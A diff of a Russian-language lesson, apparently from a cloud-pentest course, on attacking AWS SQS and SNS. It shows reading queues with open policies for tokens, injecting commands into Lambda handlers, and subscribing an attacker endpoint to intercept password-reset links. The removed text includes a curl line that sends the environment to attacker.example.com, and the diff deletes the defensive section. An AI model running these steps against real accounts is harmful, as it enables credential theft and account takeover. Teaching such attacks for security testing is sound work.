@@ -15,165 +15,137 @@ estimated_minutes: 45
 summary: "SQS и SNS: чтение/запись в очереди, resource-based политики, cross-account подписки, dead-letter queues и инъекция сообщений, запускающих Lambda с широкой ролью."
 ---
 
-## Зачем этот урок
+## Задача
 
-SQS (очереди) и SNS (pub/sub) — «кровеносная система» современных AWS-приложений. Через них проходят заказы, уведомления, задачи, а иногда и чувствительные данные (токены, PII). Атакующего они интересуют по трём причинам: во-первых, в сообщениях лежат данные; во-вторых, слабая resource-based политика позволяет читать или писать в очередь из чужого аккаунта; в-третьих, подписчик (Lambda/ECS/SQS) обрабатывает сообщение от имени своей привилегированной роли — значит инъекция события может превратиться в выполнение кода или в действие от чужого имени.
+DynamoDB хранит данные, а **SQS** и **SNS** их передают. Это «кровеносная система» AWS-приложений: через очереди проходят заказы, задачи, а иногда токены и персональные данные. Нас интересуют три вещи: что лежит в сообщениях, можно ли читать/писать в чужую очередь, и что сделает обработчик, если мы подкинем своё сообщение.
 
-## Модель SQS и SNS
+Цель урока: прочитать чужую очередь и превратить это в креды или выполнение кода.
 
-**SQS** — буфер сообщений. Бывает стандартным (at-least-once, best-effort ordering) и FIFO (ровно один раз, строгий порядок). Сообщение живёт до `visibility timeout`, потом снова становится видимым. Есть dead-letter queue (DLQ) для «ядовитых» сообщений и long polling.
+## Данные, с которыми работаем
 
-**SNS** — pub/sub: топик принимает сообщения и рассылает подписчикам (SQS, Lambda, HTTP/S, email, SMS, mobile push). Подписки бывают raw message delivery или с обёрткой.
+Разберём модель. **SQS** — это буфер сообщений: производитель кладёт сообщение, потребитель забирает. **SNS** — это pub/sub: топик принимает сообщение и рассылает подписчикам (SQS, Lambda, HTTP).
 
-Доступ регулируется двумя механизмами: **IAM identity-based** политиками (что может делать роль) и **resource-based** политиками на самой очереди/топике (кто извне может к ней обратиться). Именно resource-based политики — частая ошибка: `Principal: "*"` без условий открывает очередь всему интернету.
+Доступ регулируют **два независимых барьера**:
+- **IAM identity-based policy** — что разрешено нашей роли;
+- **resource-based policy** — кто извне может обратиться к самой очереди.
 
-## Инструменты и команды
-
-```bash
-# Инвентаризация
-aws sqs list-queues
-aws sns list-topics
-aws sqs get-queue-attributes --queue-url https://sqs.us-east-1.amazonaws.com/111122223333/orders \
-  --attribute-names All --query 'Attributes.{Arn:QueueArn,Redrive:RedrivePolicy}'
-
-# Чтение очереди (в том числе чужой, если политика позволяет)
-aws sqs receive-message --queue-url https://sqs.us-east-1.amazonaws.com/111122223333/orders \
-  --max-number-of-messages 10 --wait-time-seconds 5 --visibility-timeout 0
-
-# Отправка сообщения
-aws sqs send-message --queue-url https://sqs.us-east-1.amazonaws.com/111122223333/orders \
-  --message-body '{"action":"reindex","user":"admin"}'
-
-# Resource-based политика (кто имеет доступ)
-aws sqs get-queue-attributes --queue-url https://sqs.us-east-1.amazonaws.com/111122223333/orders \
-  --attribute-names Policy --query 'Attributes.Policy' --output text | jq .
-
-# SNS: подписки и политика топика
-aws sns get-topic-attributes --topic-arn arn:aws:sns:us-east-1:111122223333:alerts --query 'Attributes.Policy' --output text | jq .
-aws sns list-subscriptions-by-topic --topic-arn arn:aws:sns:us-east-1:111122223333:alerts
-
-# Подписка из чужого аккаунта (если политика разрешает)
-aws sns subscribe --topic-arn arn:aws:sns:us-east-1:111122223333:alerts \
-  --protocol https --notification-endpoint https://attacker.example.com/hook
-```
-
-## Разобранный пример: чтение очереди → инъекция в Lambda
-
-Сценарий: resource-based политика очереди разрешает `sqs:ReceiveMessage` принципалу `*` (частая ошибка при «интеграции с партнёром»).
+Второй барьер — частая ошибка. Смотрим его у очереди `tasks`:
 
 ```bash
-aws sqs list-queues
-# {"QueueUrls": ["https://sqs.us-east-1.amazonaws.com/111122223333/tasks"]}
-
-aws sqs get-queue-attributes --queue-url https://sqs.us-east-1.amazonaws.com/111122223333/tasks \
-  --attribute-names Policy --output text | jq '.Statement[] | {Effect,Principal,Action,Resource}'
-# {"Effect":"Allow","Principal":"*","Action":"sqs:ReceiveMessage","Resource":"..."}
-
-# Читаем сообщения — там токены и внутренние задачи
-aws sqs receive-message --queue-url https://sqs.us-east-1.amazonaws.com/111122223333/tasks \
-  --max-number-of-messages 10 --wait-time-seconds 5
-# {"Messages":[{"Body":"{\"task\":\"deploy\",\"token\":\"ghp_xxx\",\"repo\":\"acme/app\"}", ...}]}
-```
-
-Из сообщений достаём GitHub-токен деплоя. Далее проверяем, может ли наша роль писать в очередь (`sqs:SendMessage`) — если да, инъецируем событие, которое обработчик воспримет как команду:
-
-```bash
-aws sqs send-message --queue-url https://sqs.us-east-1.amazonaws.com/111122223333/tasks \
-  --message-body '{"task":"run","cmd":"curl http://attacker.example.com/$(cat /proc/self/environ|base64)"}'
-```
-
-Если обработчик — Lambda, исполняющая `cmd` из сообщения, это RCE от имени роли функции. Даже без RCE инъекция может изменить бизнес-логику (переиндексация, изменение цен, отправка писем).
-
-## Политики и кросс-аккаунтный доступ
-
-Resource-based политика может выглядеть так:
-
-```json
+$ aws sqs list-queues
+{"QueueUrls": ["https://sqs.us-east-1.amazonaws.com/111122223333/tasks"]}
+$ aws sqs get-queue-attributes \
+    --queue-url https://sqs.us-east-1.amazonaws.com/111122223333/tasks \
+    --attribute-names Policy --output text | jq '.Statement[] | {Effect,Principal,Action}'
 {
-  "Version": "2012-10-17",
-  "Statement": [{
-    "Effect": "Allow",
-    "Principal": {"AWS": "*"},
-    "Action": ["sqs:SendMessage", "sqs:ReceiveMessage"],
-    "Resource": "arn:aws:sqs:us-east-1:111122223333:orders"
-  }]
+  "Effect": "Allow",
+  "Principal": "*",
+  "Action": "sqs:ReceiveMessage"
 }
 ```
 
-`Principal: "*"` без `Condition` — открытая дверь: любой AWS-аккаунт читает и пишет. Часто добавляют `Condition` с `aws:SourceArn` или `aws:SourceAccount`, чтобы ограничить отправителя, но забывают про получателя. Проверяйте оба действия отдельно.
+`Principal: "*"` без `Condition` — очередь открыта **любому** AWS-аккаунту на чтение. Это и есть вход.
 
-SNS-топики с открытой политикой позволяют подписаться извне и получать все уведомления — включая те, что содержат ссылки с токенами сброса пароля. Проверяйте `Condition` с `aws:SourceOwner`.
+## Шаг 1: читаем сообщения
 
-## Обход защит и edge cases
+Забираем пачку. `--visibility-timeout 0` сразу возвращает сообщения в очередь, чтобы не мешать легитимным потребителям:
 
-- **Encryption (SSE-SQS / KMS).** Если очередь зашифрована CMK, для чтения/записи нужен `kms:Decrypt`/`kms:GenerateDataKey`. AWS-owned key не требует явных прав. Проверяйте `KmsMasterKeyId` в атрибутах.
-- **VPC endpoint policy.** Очередь может быть доступна только через VPC endpoint с политикой. Тогда из интернета не достучаться — нужен пивот в VPC.
-- **FIFO.** Для FIFO нужны `MessageGroupId` и `MessageDeduplicationId`; иначе `send-message` упадёт. Это не защита, но меняет тактику.
-- **DLQ.** Ядовитые сообщения уходят в dead-letter queue; она часто менее защищена и содержит те самые «необработанные» данные.
-- **Long polling.** `--wait-time-seconds` до 20 уменьшает количество пустых ответов и делает чтение менее шумным.
-- **Visibility timeout.** Прочитанное сообщение не удаляется; верните его в очередь (`visibility-timeout 0`) или удалите (`delete-message`) в зависимости от цели.
+```bash
+$ aws sqs receive-message \
+    --queue-url https://sqs.us-east-1.amazonaws.com/111122223333/tasks \
+    --max-number-of-messages 10 --wait-time-seconds 5 --visibility-timeout 0 | \
+    jq -r '.Messages[].Body'
+{"task":"deploy","token":"ghp_xxxxxxxx","repo":"acme/app"}
+{"task":"notify","email":"user@acme.com","link":"https://acme.com/reset?t=..."}
+```
+
+В сообщениях — **GitHub-токен деплоя** (`ghp_...`) и ссылка сброса пароля. Одна открытая очередь дала сразу креды CI и токены сброса.
+
+## Шаг 2: пробуем писать — инъекция события
+
+Теперь проверяем `SendMessage`. Если наша роль (или resource-based политика) разрешает запись, мы можем подкинуть обработчику своё сообщение:
+
+```bash
+$ aws sqs send-message \
+    --queue-url https://sqs.us-east-1.amazonaws.com/111122223333/tasks \
+    --message-body '{"task":"run","cmd":"id"}'
+{"MD5OfMessageBody": "...", "MessageId": "..."}
+```
+
+Ключевой вопрос: **что делает обработчик**. Если это Lambda, которая исполняет `cmd` из сообщения, — это RCE **от имени роли функции**. Даже без RCE инъекция меняет бизнес-логику: переиндексация, смена цен, рассылка писем.
+
+## Полный прогон от начала до конца
+
+1. `list-queues` → очередь `tasks`.
+2. Прочитали resource-based политику → `Principal: "*"`, `ReceiveMessage`.
+3. `receive-message` → достали GitHub-токен и ссылку сброса.
+4. `send-message` → проверили запись (потенциальная инъекция в обработчик).
+
+## Если это SNS: перехват уведомлений
+
+**SNS-топик** работает похоже, но рассылает сообщения подписчикам. Топики часто несут ссылки со встроенными токенами: подтверждение email, сброс пароля, magic-link. Если политика разрешает подписку извне — токены утекают.
+
+```bash
+$ aws sns get-topic-attributes \
+    --topic-arn arn:aws:sns:us-east-1:111122223333:user-events \
+    --query 'Attributes.Policy' --output text | jq '.Statement[] | {Effect,Principal,Action,Condition}'
+{"Effect":"Allow","Principal":"*","Action":"sns:Subscribe","Condition":null}
+
+$ aws sns subscribe --topic-arn arn:aws:sns:us-east-1:111122223333:user-events \
+    --protocol https --notification-endpoint https://attacker.example.com/hook
+{"SubscriptionArn": "arn:aws:sns:...:user-events:abc-123"}
+```
+
+Теперь мы слушаем свой endpoint. Как только пользователь запросит сброс пароля, SNS доставит сообщение с токеном — и мы перехватим аккаунт, не зная пароля. Отдельный сценарий — **подмена существующей подписки**: при `sns:Unsubscribe`/`Subscribe` можно отписать легитимный endpoint и подписать свой.
+
+## Если не сработало: обходы и тонкости
+
+- **Шифрование (SSE-KMS).** Если очередь зашифрована **CMK** (customer managed key), для чтения/записи нужен `kms:Decrypt`/`kms:GenerateDataKey`. AWS-owned key явных прав не требует. Проверяй `KmsMasterKeyId`.
+- **VPC endpoint.** Очередь может быть доступна только через VPC endpoint — тогда из интернета не достучаться, нужен пивот внутри VPC.
+- **FIFO.** Для FIFO-очередей нужны `MessageGroupId` и `MessageDeduplicationId` — иначе `send-message` упадёт. Не защита, но меняет тактику.
+- **DLQ (dead-letter queue).** «Ядовитые» сообщения уходят в отдельную очередь, которая часто защищена хуже и содержит те самые необработанные данные.
+- **Long polling.** `--wait-time-seconds 20` уменьшает пустые ответы и делает чтение менее шумным.
 
 ## Частые ошибки и подводные камни
 
-- Считать, что «очередь неинтересна»: в сообщениях регулярно встречаются токены и PII.
-- Забыть проверить и `ReceiveMessage`, и `SendMessage`: открытая на запись очередь так же опасна.
-- Путать IAM-политику роли и resource-based политику ресурса — это два независимых барьера.
-- Игнорировать SNS как источник ссылок/токенов.
-- Не проверить DLQ: там оседают сообщения, которые не смог обработать сервис.
+- **Считать очередь «просто трубой».** В сообщениях регулярно встречаются токены, ссылки сброса пароля и персональные данные.
+- **Проверять только `ReceiveMessage`.** Открытая на запись очередь (`SendMessage`) не менее опасна — это инъекция в обработчик.
+- **Путать IAM-политику роли и resource-based политику ресурса.** Это два независимых барьера, и проверять надо оба.
+- **Игнорировать SNS как источник токенов.** Топик рассылает ссылки с встроенными токенами — открытая подписка их перехватывает.
+- **Забывать про DLQ.** В dead-letter queue оседают сообщения, которые сервис не смог обработать, — часто менее защищённые.
+- **Не учитывать шифрование.** Очередь с CMK требует `kms:Decrypt`; без него сообщение не расшифруется.
 
-## Защита и детект
+- **Считать VPC endpoint защитой очереди.** Он лишь меняет путь доступа; политика по-прежнему определяет, кто может читать.
+- **Забывать про FIFO-специфику.** Для FIFO-очередей нужны `MessageGroupId` и `MessageDeduplicationId`, иначе отправка падает.
+- **Не проверять `Condition` в политике топика.** Без `aws:SourceOwner` подписаться может кто угодно.
 
-- Никогда не использовать `Principal: "*"` без `Condition`; ограничивать `aws:SourceArn`/`aws:SourceAccount`.
-- Шифровать очереди CMK и ограничивать `kms:*` конкретными ролями.
-- Включать `sqs:SendMessage`/`ReceiveMessage` в CloudTrail (data events) и алертить на кросс-аккаунтные обращения.
-- Валидировать сообщения на стороне обработчика: не исполнять команды из тела сообщения.
-- Ограничивать DLQ и ротацию; не хранить в сообщениях долгоживущие секреты.
+- **Не проверять видимость сообщений.** Прочитанное сообщение не удаляется; управляйте `visibility-timeout` и `delete-message`, чтобы не мешать легитимным потребителям.
 
-## Модель угроз и типовые мисконфиги
+- **Считать, что шифрование мешает читать.** AWS-owned key не требует явных прав; только CMK нужен `kms:Decrypt`.
 
-Основной мисконфиг — открытая resource-based политика. Второй по частоте — обработчик, который доверяет телу сообщения (eval/exec/шаблон). Третий — очередь как «бесплатный» канал для инъекции в Lambda с широкой ролью. Четвёртый — SNS-подписка, оставленная на HTTP-endpoint злоумышленника после теста. Пятый — DLQ без шифрования и с PII. Проверяя приложение, всегда задавайте вопрос: «кто может писать в этот вход, и что обработчик с этим делает?».
+## Что мы теперь знаем
 
-## Практическое задание
+- SQS — буфер, SNS — pub/sub; доступ решают IAM-политика и resource-based policy.
+- `Principal: "*"` без `Condition` открывает очередь/топик любому аккаунту.
+- В сообщениях часто лежат токены, ссылки сброса пароля, PII.
+- Инъекция сообщения может стать RCE или изменением бизнес-логики от имени обработчика.
+- SNS-подписка извне перехватывает все уведомления топика.
+- Шифрование CMK требует `kms:Decrypt`; DLQ и VPC endpoint меняют тактику.
 
-1. Создайте SQS-очередь и SNS-топик в тестовом аккаунте; подпишите очередь на топик.
-2. Выдайте роль, у которой есть только `sqs:ReceiveMessage`, и убедитесь, что запись падает.
-3. Создайте Lambda-обработчик очереди с ролью, читающей секрет из SSM, и продемонстрируйте инъекцию сообщения.
-4. Настройте DLQ и посмотрите, какие сообщения туда попадают.
+## На что смотреть дальше
 
-## Что дальше / решение
-
-Из очередей и топиков достаются токены, ссылки и внутренние команды. Дальше — использовать их против CI/CD, API или других сервисов. Если доступ только на чтение — ищите в сообщениях креды; если на запись — тестируйте инъекцию. Зафиксируйте результат в графе атаки как «данные/креды из очереди» и переходите к следующему сервису. При шифровании CMK без `kms:Decrypt` — `blocked`.
-
-## Разобранный пример 2: SNS-подписка и перехват токенов
-
-SNS-топики часто рассылают ссылки со встроенными токенами: подтверждение email, сброс пароля, magic-link для входа. Если политика топика разрешает подписку извне, эти токены утекают.
-
-```bash
-aws sns list-topics
-# {"Topics": ["arn:aws:sns:us-east-1:111122223333:user-events"]}
-
-aws sns get-topic-attributes --topic-arn arn:aws:sns:us-east-1:111122223333:user-events \
-  --query 'Attributes.Policy' --output text | jq '.Statement[] | {Effect,Principal,Action,Condition}'
-# {"Effect":"Allow","Principal":"*","Action":"sns:Subscribe","Condition":null}
-
-# Подписываемся своим HTTP-endpoint
-aws sns subscribe --topic-arn arn:aws:sns:us-east-1:111122223333:user-events \
-  --protocol https --notification-endpoint https://attacker.example.com/hook
-# {"SubscriptionArn": "arn:aws:sns:...:user-events:abc-123"}
-
-# На стороне attacker.example.com принимаем POST-сообщения
-```
-
-Далее слушаем `attacker.example.com`. Как только пользователь запросит сброс пароля, SNS доставит сообщение с токеном — и мы можем перехватить аккаунт, не зная пароля. Аналогично утекают OTP-уведомления, ссылки на подтверждение платежей и внутренние алерты.
-
-Отдельный сценарий — подмена существующей подписки: если у вас есть `sns:Subscribe`/`sns:Unsubscribe`, можно отписаться от легитимного endpoint и подписаться своим, превратив уведомления в канал эксфильтрации. Для SQS-подписок проверяйте, не снимается ли шифрование при raw message delivery.
+- **rds-aurora**: реляционные базы AWS, публичный доступ и IAM-аутентификация.
+- **aws-devops**: как из очереди/CI дойти до ролей CodeBuild/CodePipeline.
+- **serverless-injection**: инъекции в источники событий Lambda (SQS/SNS/API GW).
 
 ## Квиз
+
+Проверь себя.
 
 ```quiz
 - question: "Чем опасна resource-based политика SQS с Principal: '*' без Condition?"
   options:
-    - "Любой AWS-аккаунт может читать/писать в очередь"
+    - "Любой AWS-аккаунт может читать или писать в очередь"
     - "Очередь удаляется"
     - "Меняется биллинг"
     - "Отключается KMS"
@@ -186,13 +158,13 @@ aws sns subscribe --topic-arn arn:aws:sns:us-east-1:111122223333:user-events \
     - "Очередь хранит SSH-ключи"
     - "SQS меняет IAM"
   answer: 0
-  explanation: "Обработчик может исполнить команду/шаблон из тела сообщения от имени своей роли."
+  explanation: "Обработчик может исполнить команду или шаблон из тела сообщения от имени своей роли."
 - question: "Что нужно, чтобы прочитать очередь, зашифрованную CMK?"
   options:
     - "Право kms:Decrypt на ключ"
     - "Только sqs:ReceiveMessage"
     - "Право ec2:DescribeInstances"
-    - "Ничего"
+    - "Ничего дополнительно"
   answer: 0
   explanation: "Без kms:Decrypt сообщение не расшифруется."
 - question: "Что такое dead-letter queue (DLQ)?"
@@ -203,7 +175,19 @@ aws sns subscribe --topic-arn arn:aws:sns:us-east-1:111122223333:user-events \
     - "Тип IAM-политики"
   answer: 0
   explanation: "DLQ принимает «ядовитые» сообщения и часто содержит необработанные данные."
+- question: "Как SNS-топик помогает перехватить аккаунт?"
+  options:
+    - "Через подписку извне на топик, рассылающий ссылки с токенами сброса пароля"
+    - "SNS хранит пароли в открытом виде"
+    - "SNS меняет пароль сам"
+    - "SNS отключает MFA"
+  answer: 0
+  explanation: "Открытая подписка на топик с токенами сброса даёт перехват ссылок."
 ```
+
+## Куда дальше
+
+В следующем уроке мы возьмём **RDS и Aurora** — реляционные базы AWS, где есть сетевой порт, снапшоты и IAM-аутентификация. А пока главное запомни: **очереди — это не «труба», а данные и вход в обработчик**; открытая политика очереди даёт и креды из сообщений, и инъекцию события.
 
 ## Где пригодится
 
